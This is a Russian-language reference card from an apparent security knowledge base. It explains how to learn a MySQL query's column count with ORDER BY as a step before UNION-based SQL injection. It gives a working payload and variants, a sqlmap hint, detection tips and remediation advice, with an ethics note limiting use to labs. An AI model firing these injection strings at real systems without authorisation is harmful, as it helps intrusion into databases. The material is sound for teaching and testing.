---
id: sqli-mysql-order-by-column-count
title: "MySQL: определение числа колонок через ORDER BY"
type: sqli
target: mysql
category: web
difficulty: beginner
bypass: none
tags: [sqli, mysql, enumeration, recon]
tested_on: ["MySQL 8.0", "SQLite 3.40 (sqli-lab)"]
success_rate: 0.85
risk: low
cwe: "CWE-89"
lab: "labs/web-labs/sqli-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
---

# MySQL: определение числа колонок через ORDER BY

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
1' ORDER BY 3 -- -
```

## Explanation

Перед `UNION` нужно знать число колонок исходного запроса. `ORDER BY N` сортирует
по N-й колонке: пока N не превышает числа колонок — ответ обычный, при превышении —
ошибка `Unknown column 'N' in 'order clause'` (или пустой/иной ответ).
Перебор N = 1, 2, 3... даёт точное число.

## Detection

Ищите в запросах параметры вида `?id=1 ORDER BY 5`, `?id=1) UNION SELECT NULL--`.
Автоматически: `sqlmap --technique=U` сам подбирает число колонок.

## Remediation

- Whitelist для значений `ORDER BY` (карта «алиас -> колонка»), никаких сырых строк.
- Параметризация остальных частей запроса.
- Скрытие текстов ошибок СУБД.

## Variants

```
1 ORDER BY 1-- -
```

```
1' ORDER BY 10-- -
```

```
1) ORDER BY 5-- -
```
